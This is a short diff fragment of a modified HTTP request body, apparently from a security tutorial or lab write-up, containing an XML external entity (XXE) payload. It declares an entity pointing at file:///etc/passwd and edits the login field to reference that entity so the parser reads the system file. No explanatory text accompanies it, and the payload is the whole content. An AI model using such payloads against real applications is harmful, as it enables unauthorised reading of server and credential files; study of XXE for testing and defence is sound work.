@@ -12,7 +12,7 @@ MODIFIED REQUEST:
 <!DOCTYPE foo [  
 <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <reset>
-    <login>&example;</login>
+    <login>&xxe;</login>
     <secret>Any bugs?</secret>
 </reset>
 
